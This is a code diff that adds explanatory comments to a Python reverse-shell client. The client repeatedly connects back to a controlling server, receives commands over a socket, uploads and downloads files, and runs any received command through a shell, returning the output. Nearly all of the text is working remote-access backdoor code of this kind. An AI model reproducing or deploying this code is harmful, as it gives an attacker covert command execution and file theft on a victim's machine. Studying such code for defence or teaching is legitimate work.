@@ -4,6 +4,7 @@ import subprocess
 import json
 import os
 
+# function to send data reliably over the socket connection
 def reliable_send(data):
         jsondata = json.dumps(data)
         s.send(jsondata.encode())
@@ -19,7 +20,7 @@ def reliable_recv():
 
 
 
-
+# function to establish connection with specifeid IP and port 
 def connection():
 	while True:
 		time.sleep(20)
@@ -31,11 +32,12 @@ def connection():
 		except:
 			connection()
 
+# Function to upload file 
 def upload_file(file_name):
 	f = open(file_name, 'rb')
 	s.send(f.read())
 
-
+# Function to download file 
 def download_file(file_name):
         f = open(file_name, 'wb')
         s.settimeout(1)
@@ -49,7 +51,7 @@ def download_file(file_name):
         s.settimeout(None)
         f.close()
 
-
+# main function to handle shell commands recieved from the server
 def shell():
 	while True:
 		command = reliable_recv()
@@ -63,7 +65,8 @@ def shell():
 			upload_file(command[9:])
 		elif command[:6] == 'upload':
 			download_file(command[7:])
-		else:
+		else: 
+# Execute the command on the local machine and send back the result#
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			result = execute.stdout.read() + execute.stderr.read()
 			result = result.decode()
